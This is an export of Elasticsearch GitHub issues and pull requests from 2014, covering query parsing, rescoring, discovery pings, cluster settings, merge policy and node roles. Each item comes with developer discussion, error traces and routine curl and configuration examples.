
Unsure if this is the best solution - we might as well just change the test SimpleIndexQueryParserTests#testQueryStringFieldsMatch 
</description><key id="42638772">7709</key><summary>field name lookup: return List instead of Set for names matching a patte...</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels /><created>2014-09-12T15:09:36Z</created><updated>2014-09-26T08:00:46Z</updated><resolved>2014-09-26T08:00:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-14T16:59:59Z" id="55531766">If the function is only used for iteration, why not change it to return Iterator&lt;String&gt;? Something like `Iterator&lt;String&gt; simpleMatchNameIterator()`?
</comment><comment author="s1monw" created="2014-09-18T14:33:01Z" id="56046747">Iterator is tricky since you can't tell if it's empty or not you always need to iterate. I also think if we change it it should be `Iterable` instead. change looks good to me
</comment><comment author="rjernst" created="2014-09-23T04:09:16Z" id="56474430">@s1monw Isn't the empty case just `hasNext() == false` right away?
</comment><comment author="s1monw" created="2014-09-23T06:22:48Z" id="56480344">@rjernst you are right in theory yet, if you do that you can't use a simple for loop unless you pull the iterator again. You also have problems if you wanna short circuit like in `ExistsFilterParser.java`:

``` Java
        List&lt;String&gt; fields = parseContext.simpleMatchToIndexNames(fieldPattern);
         if (fields.isEmpty()) {
             // no fields exists, so we should not match anything
             return Queries.MATCH_NO_FILTER;
         }
```

I also like the order guarantees the list has vs a iterable/iterator where you don't know where it's coming from. 
</comment><comment author="rjernst" created="2014-09-23T17:40:36Z" id="56559349">Ok, I don't care that much.  LGTM! :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>putmapping elastic serach not working with js api</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7708</link><project id="" key="" /><description>client.indices.putMapping({"index":"test","type":"persons","body":{"mappings":{"properties":{"mname":{"type":"string","store":true}}}}},    callback)

i am getting this error

MapperParsingException[Root type mapping not empty after parsing! Remaining fields:   [mappings : {properties={mname={type=string, store=true}}}]] Error: MapperParsingException[Root type mapping not empty after parsing! Remaining fields:   [mappings : {properties={mname={type=string, store=true}}}]]     at respond (/home/rajit/IdeaProjects/Applane/node_modules/elasticsearch/src/lib/transport.js:234:15)     at checkRespForFailure (/home/rajit/IdeaProjects/Applane/node_modules/elasticsearch/src/lib/transport.js:202:7)     at HttpConnector.&lt;anonymous&gt; (/home/rajit/IdeaProjects/Applane/node_modules/elasticsearch/src/lib/connectors/http.js:148:7)     at IncomingMessage.bound (/home/rajit/IdeaProjects/Applane/node_modules/elasticsearch/node_modules/lodash-node/modern/internals/baseBind.js:56:17)     at IncomingMessage.emit (events.js:117:20)     at _stream_readable.js:943:16     at process._tickCallback (node.js:419:13)

node module elastic search version is 2.4.2
elastic search server is 1.3.2
</description><key id="42637118">7708</key><summary>putmapping elastic serach not working with js api</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rajit-daffodil</reporter><labels><label>non-issue</label></labels><created>2014-09-12T14:54:07Z</created><updated>2014-09-15T07:19:23Z</updated><resolved>2014-09-15T07:11:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rajit-daffodil" created="2014-09-13T08:43:18Z" id="55485807">I have found my mistake, i have not written JSON field within putmapping right, it should be {"index":"test","type":"persons","body":{"persons":{"properties":{"mname":{"type":"string","store":true}}}}}, it is now working fine
</comment><comment author="javanna" created="2014-09-15T07:11:26Z" id="55558540">Glad to hear you solved @rajit-daffodil , closing this issue then.
</comment><comment author="rajit-daffodil" created="2014-09-15T07:19:23Z" id="55559002">Thanks javanna for informing, actually I don't know about this
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Switch to Lucene QueryRescorer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7707</link><project id="" key="" /><description>Simon started this with #6232 and I just simplified it a bit ...

One functional change I did was: if a first pass hit did not "participate" in rescoring (because it wasn't in the top window hits), I multiply its score by rescore.queryWeight() matching what we do when it did participate but the 2nd pass query didn't match it.  I'm not sure that's "correct" but I think it's "more correct" than just using the raw first pass score ...
</description><key id="42634993">7707</key><summary>Switch to Lucene QueryRescorer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Search</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-12T14:32:28Z</created><updated>2015-06-07T17:15:01Z</updated><resolved>2014-10-18T09:27:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-10-06T07:54:00Z" id="57984443">@mikemccand I tried to review this change and left some questions, but I'm not familiar with rescoring at all so they might be naive
</comment><comment author="mikemccand" created="2014-10-17T11:15:42Z" id="59498910">I updated the docs to add caution about not changing the rescore window nor size, when stepping through pages, since that may "shift" the results.

I also updated the test cases to 1) test that pagination works (passing non-zero from indeed does what's expected), and 2) test the strange-yet-possible case where the rescorer causes results to have worse scores than non-rescored hits.

I think it's ready...
</comment><comment author="jpountz" created="2014-10-17T13:02:20Z" id="59508978">+1 to push. I left comments since the rescoring behaviour is still obscure to me but I agree this change makes things better!
</comment><comment author="mikemccand" created="2014-10-17T13:51:05Z" id="59515367">Thanks @jpountz ... I improved the docs: I cutover to admonition paragraph (thanks for the pointer!) and softened it to say it's only window_size that must not be changed across page requests.

The "new score is lower than old score" problem, I think we should not try to tackle here: it's tricky, and it may be some use cases want to do this.

I also added another TODO, that it should really be ScoreMode that handles the "2nd pass query did't match" case ... right now we effectively hardwire to ScoreMode.Total.

I'll open a separate issue about explain ignoring window_size...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Discovery: make sure we maintain the latest PingResponse from each node</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7706</link><project id="" key="" /><description>When each node gets a unicast ping, in responds with a list of ping it has received in the last 3 seconds. With #7702, we run into an issue were earlier pings in this list were preferred to later pings - causing election to be done based on stale information.  

It is how ever still the case that ping list from _different_ sources may case old pings to override new pings. We should introduce an increasing only ping id and use it to make sure older pings never replace new information.
</description><key id="42622882">7706</key><summary>Discovery: make sure we maintain the latest PingResponse from each node</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">bleskes</reporter><labels /><created>2014-09-12T12:13:49Z</created><updated>2014-09-25T11:36:10Z</updated><resolved>2014-09-25T11:35:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-25T11:35:56Z" id="56806282">Closed by #7769 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make the elasticsearch blog searchable</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7705</link><project id="" key="" /><description>Hi,

Reading the blog regularly, there are interesting articles that I don't need for the moment but want do keep in mind for future developments. I'd appreciate to be able to search for them, the same way we can search for the documentation today (http://www.elasticsearch.org/guide/).

Moreover, the types of articles in the blog fall into a few categories. I've listed:
- Weekly news ("This week in Elasticsearch")
- Events &amp; meetings ("Where in the World is Elasticsearch")
- Releases announcements ("Elasticsearch &lt;product&gt; &lt;version&gt; released")
- Others (mainly tips/howto use a particular feature, like "Using the percolator for geo tagging")

Having in the /blog page the possibility to filter by category seems useful to me.

Ik
</description><key id="42622848">7705</key><summary>Make the elasticsearch blog searchable</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">iksnalybok</reporter><labels /><created>2014-09-12T12:13:19Z</created><updated>2015-03-22T15:47:11Z</updated><resolved>2015-03-22T15:47:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T18:11:59Z" id="56713982">Hi @iksnalybok 

Agreed - there are plans afoot to make this better :)
</comment><comment author="javanna" created="2015-03-22T15:47:11Z" id="84638340">With the new [website](https://www.elastic.co/) all of the blogs have been made searchable too, I think we can close this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>add support for resetting dynamic cluster settings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7704</link><project id="" key="" /><description>This PR implements support for resetting transient &amp; persistent cluster settings to, either the configuration file value defined at node startup, or if it does not existed, the default value.

Resetting settings is done using the normal cluster update settings API, by just assigning a JSON `null` to the setting one want to reset. See `update-settings.asciidoc` for details.

There are maybe other/smarter ways to do that, but I think this is just straight-forward and it works ;)
This is related to https://github.com/elasticsearch/elasticsearch/issues/6732, but does only apply to cluster settings not custom analyzer.
</description><key id="42614239">7704</key><summary>add support for resetting dynamic cluster settings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">seut</reporter><labels><label>enhancement</label><label>review</label></labels><created>2014-09-12T10:06:37Z</created><updated>2016-02-03T11:06:22Z</updated><resolved>2015-12-18T10:59:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T18:04:26Z" id="56712896">Hi @seut 

Thanks for the PR.  We'll take a look and get back to you
</comment><comment author="seut" created="2014-11-12T13:48:44Z" id="62719601">any news on this? Of course I would rebase the master if there is any chance that this PR will be accepted..
</comment><comment author="seut" created="2014-11-20T13:30:46Z" id="63807637">just rebased the current master and updated the commit to respect new implemented settings.
</comment><comment author="clintongormley" created="2014-11-24T12:58:55Z" id="64190339">@s1monw what do you think about this? 
</comment><comment author="seut" created="2015-01-12T10:52:46Z" id="69553943">any updates on this?
</comment><comment author="clintongormley" created="2015-01-13T21:00:23Z" id="69818893">Hi @seut 

Sorry for the delay - it's tricky finding time to review big PRs.  We haven't forgotten about it.  Also need to make sure it plays nicely with the changes planned in #6732
</comment><comment author="seut" created="2015-01-14T09:48:59Z" id="69892159">@clintongormley I understand. Will save my time with rebasing the current master until you'll accept the general logic of this code. Or otherwise, please poke me to rebase it.
</comment><comment author="clintongormley" created="2015-01-14T09:53:08Z" id="69892702">thanks @seut 
</comment><comment author="s1monw" created="2015-12-07T19:15:27Z" id="162628860">FYI - I opened #15278 which basically supersedes this PR. @seut if you don't mind I will take some REST tests from you and steal some ideas? :)
</comment><comment author="seut" created="2015-12-09T13:56:23Z" id="163243952">@s1monw sure take what you need ;)
</comment><comment author="s1monw" created="2015-12-18T10:59:32Z" id="165748608">closing since https://github.com/elastic/elasticsearch/pull/15278 is merged 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Running metrics on buckets by doc_count</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7703</link><project id="" key="" /><description>It would be really useful to run metrics on the doc_count field of buckets returned by aggregations, rather than just on fields of the documents in the buckets themselves.

My particular use-case is that I have an index of timestamped log entries, and I want to find the distrubution of log rate per unit time.  In particular I might want to find the 95th-percentile logs per second.  It's easy enough to partition the data into second-size buckets using date_histogram, and then get a doc_count for each second in the month, but the only way to split these into percentiles is to sort by doc_count and then download the data to the client and do the percentile calculations there.

Maybe I'm missing some functionality and there is a way to do this, but this forum post in May 2014 says that it's impossible: http://elasticsearch-users.115913.n3.nabble.com/stats-extended-stats-percentiles-for-doc-count-in-aggregations-td4055201.html

Sorry if this has been discussed and ruled out.
</description><key id="42613640">7703</key><summary>Running metrics on buckets by doc_count</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jmacmahon</reporter><labels /><created>2014-09-12T09:58:31Z</created><updated>2014-09-24T18:00:34Z</updated><resolved>2014-09-24T18:00:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T18:00:34Z" id="56712298">Hi @jmacmahon 

Agreed this would be nice to have.  I'm going to close this issue in favour of #4404, which is similar.

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Restore preference to latest unicast pings describing the same node</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7702</link><project id="" key="" /><description>#5413 introduced a change where we prefer ping responses containing a master over those who don't. The same change changes the preference of acceptance if both pings have a master indication or if neither do.

 #7558 added new flag to the PingResponse which changes after a node has joined the cluster for the very first time. Giving preference to older pings cause the wrong value of this flag to be used.   This commit restores the preference to the original one.
</description><key id="42611853">7702</key><summary>Restore preference to latest unicast pings describing the same node</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>regression</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-12T09:35:45Z</created><updated>2015-06-08T00:43:47Z</updated><resolved>2014-09-12T12:04:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-12T09:46:54Z" id="55381836">LGTM
</comment><comment author="s1monw" created="2014-09-12T11:34:57Z" id="55391240">+1 to push this as a temporary solution - can you open a followup issue?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update java source example</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7701</link><project id="" key="" /><description>From the version 1.0 FilterBuilders and QueryBuilders are not part from org.elasticsearch.index.query.xcontent package no more.
</description><key id="42604608">7701</key><summary>Update java source example</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">eliasah</reporter><labels><label>docs</label></labels><created>2014-09-12T07:50:49Z</created><updated>2014-09-22T12:38:25Z</updated><resolved>2014-09-22T12:38:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-22T12:38:25Z" id="56366496">Merged. Thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Metric: Track the number of times a Thread is prevented from immediately running in Thread Pools</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7700</link><project id="" key="" /><description>In the thread pool, we currently track the `largest` number of threads that it has contained, but this will eventually hit the `max` threads. If possible, it would be great to track when a new thread is prevented from starting because the pool is full already, which could help indicate how many times actions are inherently delayed by overloaded thread pools and the rejections would indicate how many times it was just too much to even wait for.
</description><key id="42581638">7700</key><summary>Metric: Track the number of times a Thread is prevented from immediately running in Thread Pools</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">pickypg</reporter><labels><label>enhancement</label><label>feedback_needed</label></labels><created>2014-09-11T23:18:30Z</created><updated>2015-04-26T19:35:48Z</updated><resolved>2015-04-26T19:35:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-07T11:21:44Z" id="62129671">Hi @pickypg 

What new info would this metric give us?  Also, having positive values in this count could encourage people to increase their thread count, which is almost always the wrong reatction.
</comment><comment author="pickypg" created="2014-12-29T18:13:52Z" id="68282000">@clintongormley It would help to figure out when you are consistently overloading the threadpool, which should give an idea how often you're putting things into the queue rather than forcing you to catch it in the act.

&gt; Also, having positive values in this count could encourage people to increase their thread count, which is almost always the wrong reaction.

I do agree with that thought, which may make it not worthwhile.
</comment><comment author="clintongormley" created="2015-04-26T19:35:47Z" id="96423601">Closing in favour of #10601
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>reclaim_deletes_weight doesn't have any effect</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7699</link><project id="" key="" /><description>I've been trying to play with merge settings lately and I _think_ `reclaim_deletes_weight` isn't getting set dynamically.  I turned up the logging and got [this](https://gist.github.com/nik9000/9a533d33986241524fe3) for an index where I cranked the weight up to a ridiculous number (64 or something).  When I run the math for calculating the score it looks like it is using the default of 2 no matter what I set.

Here is the command I use to set the weight:

``` js
curl -XPUT 'elastic1001:9200/enwiktionary_content/_settings' -d '{
  "index" : {
    "merge" : {
      "policy": {
        "max_merge_at_once": 4,
        "segments_per_tier": 4,
        "reclaim_deletes_weight": 32.0
      }
    }
  }
}'
```

and I get this log:

```
[&lt;faked&gt;][INFO ][index.merge.policy       ] [elastic1013] [enwiktionary_content_1407996688][2] updating [reclaim_deletes_weight] from [8.0] to [64.0]
```
</description><key id="42566047">7699</key><summary>reclaim_deletes_weight doesn't have any effect</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">nik9000</reporter><labels /><created>2014-09-11T20:15:46Z</created><updated>2014-12-19T11:27:18Z</updated><resolved>2014-12-19T11:27:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-11T20:18:43Z" id="55321891">I should also mention that I gave the setting some time to take effect before running the numbers.  Hours in some cases.
</comment><comment author="nik9000" created="2014-09-12T18:30:18Z" id="55442556">I can reproduce this locally on the 1.3 branch.  I'm fussing around with breakpoints to figure out exactly what is up.
</comment><comment author="nik9000" created="2014-09-12T18:56:31Z" id="55445795">OK.  Got it.  The problem is that in the 1.3 branch TieredMergePolicyProvider _looks_ _like_ it keeps a list of merge policies so it can update them all when something changes but it never adds anything to the list.  @rmuir fixed this when he upgraded to Lucene 4.10, presumably because keeping a single mergePolicy became ok.

So this is solved in whatever release picks up Lucene 4.10, presumably 1.4.

(maybe) beside the point, I noticed that there weren't any volatile variables in TieredMergePolicyProvider.  My understanding of how the jvm uses these to force synchronization across threads is pretty handwavy.  Can someone with more experience chime in about whether there are potential problems with the changes becoming visible here?   
</comment><comment author="nik9000" created="2014-09-12T19:51:58Z" id="55452496">I'm pretty sure this prevented merge settings from being dynamic in most cases - only if the shard is moved to another node or maybe closed and reopened will the changes take effect.  Maybe if you change from TieredMergePolicy to another on and then back again.
</comment><comment author="clintongormley" created="2014-09-24T18:25:45Z" id="56715981">@nik9000 reopening this to get comments, otherwise nobody will ever look at it again :)
</comment><comment author="clintongormley" created="2014-09-24T18:30:07Z" id="56716625">@mikemccand can you shed any light on @nik9000 's last two comments?
</comment><comment author="nik9000" created="2014-09-24T18:44:55Z" id="56718825">@clintongormley, the ones about visibility?  I imagine they're moot.  My rambling about switching from TieredMergePolicy and back again are really just trying to figure out a way to get it working with 1.3.2.
</comment><comment author="ayushsangani" created="2014-12-17T21:02:01Z" id="67393475">@nik9000 We upgraded ES to 1.4.0 `reclaim_deletes_weight` seems to be working. Thanks
</comment><comment author="clintongormley" created="2014-12-19T11:27:18Z" id="67627446">OK - closing then
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Ensure GroupShardsIterator is consistent across requests, to ensure consistent sorting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7698</link><project id="" key="" /><description>GroupShardsIterator is used in many places like the search execution
to determine which shards to query. This can hold shards of one index
as well as shards of multiple indices. The iteration order is used
to assign a per-request shard ID for each shard that is used as a
tie-breaker when scores are the same. Today the iteration order is
solely dependent on the HashMap iteration order which is undefined or
rather implementation dependent. This causes search requests to return
inconsistent results across requests if, for instance, different nodes
are coordinating the requests.

Simple queries like `match_all` may return results in arbitrary order
if pagination is used or may even return different results for the same
request even though there hasn't been a refresh call and preferences are
used.
</description><key id="42559921">7698</key><summary>Ensure GroupShardsIterator is consistent across requests, to ensure consistent sorting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>blocker</label><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T19:12:03Z</created><updated>2015-06-07T18:44:55Z</updated><resolved>2014-09-12T05:39:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-11T21:39:18Z" id="55332951">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Inconsistent sorting of top_hits fixed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7697</link><project id="" key="" /><description>In the reduce logic of the `top_hits` aggregation if the first shard result to process contained has no results then the merging of all the shard results can go wrong resulting in an incorrect sorted hits.

This bug can only manifest with a sort other than score.
</description><key id="42536817">7697</key><summary>Inconsistent sorting of top_hits fixed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>:Aggregations</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T15:24:40Z</created><updated>2017-03-31T10:06:20Z</updated><resolved>2014-09-11T15:27:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Cat nodes api does not return c for a client node as per documentation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7696</link><project id="" key="" /><description>The documentation for the cat nodes API states that a client node should have a role of 'c' and a data node should have a role of 'd'
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cat-nodes.html

When i make a request to my cluster consisting of:
1. Master only node
2. Client only node
3. Data only node
using the cluster state API, i get:

```
curl 'localhost:9200/_cluster/state?pretty'
{
  "cluster_name" : "&lt;somename&gt;",
  "version" : 5,
  "master_node" : "94-DZRpNRbuHK1KtlhbKAw",
  "blocks" : { },
  "nodes" : {
    "069e2EMORHauOdpyK8nLjQ" : {
      "name" : "data",
      "transport_address" : "inet[/X.X.X.X:9300]",
      "attributes" : {
        "master" : "false"
      }
    },
    "94-DZRpNRbuHK1KtlhbKAw" : {
      "name" : "master",
      "transport_address" : "inet[/X.X.X.X:9300]",
      "attributes" : {
        "data" : "false",
        "master" : "true"
      }
    },
    "Dry91N6jRy24RZq0yJ5MZw" : {
      "name" : "client",
      "transport_address" : "inet[/X.X.X.X:9300]",
      "attributes" : {
        "data" : "false",
        "master" : "false"
      }
    }
  },
```

So in the above example, i have 1 of each type of node (as per the attributes)

If i make a node API's request via the CAT api:

```
# curl localhost:9200/_cat/nodes?v\&amp;h=v,r,n
v     r n                       
1.3.2 d data   
1.3.2 - master 
1.3.2 - client 
```

I would have expected the last line to be:
1.3.2 c client 

to indicate the role of the client node
</description><key id="42535317">7696</key><summary>Cat nodes api does not return c for a client node as per documentation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">derryos</reporter><labels /><created>2014-09-11T15:11:28Z</created><updated>2014-09-24T18:05:05Z</updated><resolved>2014-09-11T15:46:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T15:46:26Z" id="55283892">Hi @derryos 

A client is a node that has been started with:

```
node.client: true
```

It is not sufficient to have:

```
node.data: false
node.master: false
```

If you do that, then everything works as expected.
</comment><comment author="derryos" created="2014-09-11T15:52:55Z" id="55284811">Thanks for the clarification. The node that i had created (e.g. non data and non master) - what is the distinction between that and a client node?

If i look at the latest elasticsearch.yml on master, i see:

```
# You can exploit these settings to design advanced cluster topologies.
#
# 1. You want this node to never become a master node, only to hold data.
#    This will be the "workhorse" of your cluster.
#
#node.master: false
#node.data: true
#
# 2. You want this node to only serve as a master: to not store any data and
#    to have free resources. This will be the "coordinator" of your cluster.
#
#node.master: true
#node.data: false
#
# 3. You want this node to be neither master nor data node, but
#    to act as a "search load balancer" (fetching data from nodes,
#    aggregating results, etc.)
#
#node.master: false
#node.data: false
```

but i don't see node.client mentioned as a setting. I'm just trying to understand the difference from a setting/configuration point of view...

Also: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-node.html mentions that a client is node.master: false and node.data: false
</comment><comment author="derryos" created="2014-09-12T10:14:54Z" id="55384357">After checking the code and discussing with people on IRC, it was pointed out that the main difference between client: true and node.master: false, node.data: false is the inability to use rivers - otherwise, it's only used in testing/stats:
https://github.com/elasticsearch/elasticsearch/search?utf8=%E2%9C%93&amp;q=.clientNode%28%29

Also, it seems that the logic i was suggesting is checked in some places:
https://github.com/elasticsearch/elasticsearch/blob/a50934ea3edb9bf42b3eb1f47db53fc088e9cb7d/src/main/java/org/elasticsearch/discovery/zen/ZenDiscovery.java#L951
</comment><comment author="clintongormley" created="2014-09-24T18:05:05Z" id="56712995">Yeah, we may simplify this in the future.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improve exception from Store.failIfCorrupted</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7695</link><project id="" key="" /><description>If you have previously corrupted files, this method currently builds an
exception like:

```
    failed engine [corrupted preexisting index]
    failed to start shard
```

Followed by a CorruptIndexException. This commit writes the entire
stacktrace to provide additional information. It also changes the
failure message from `corrupted preexisting index` to `preexisting
corrupted index` to prevent confusion.

Closes #7596
